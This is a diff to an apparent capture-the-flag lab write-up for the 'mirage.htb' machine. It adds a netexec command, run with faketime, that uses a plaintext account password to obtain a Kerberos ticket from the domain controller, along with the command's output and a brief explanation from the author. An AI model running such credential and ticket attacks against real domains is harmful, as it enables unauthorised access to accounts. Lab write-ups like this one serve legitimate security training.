@@ -711,8 +711,16 @@ Clock skew detected. Adjusting local time by 7:00:00.332154. Retrying operation.
 This also sets his account to full logon hours
 
 ```python
-
+❯❯❯ faketime -f +7h nxc smb dc01.mirage.htb -u 'javier.mmarshall' -p 'Password123!' -k --generate-tgt javier
+SMB         dc01.mirage.htb 445    dc01             [*]  x64 (name:dc01) (domain:mirage.htb) (signing:True) (SMBv1:None) (NTLM:False)
+SMB         dc01.mirage.htb 445    dc01             [+] mirage.htb\javier.mmarshall:Password123! 
+SMB         dc01.mirage.htb 445    dc01             [+] TGT saved to: javier.ccache
+SMB         dc01.mirage.htb 445    dc01             [+] Run the following command to use the TGT: export KRB5CCNAME=javier.ccache
 ```
+
+Then i can auth and get a TGT becuase i think there is a cleanup script thats resetting the account to change it back
+
+
 
 
 
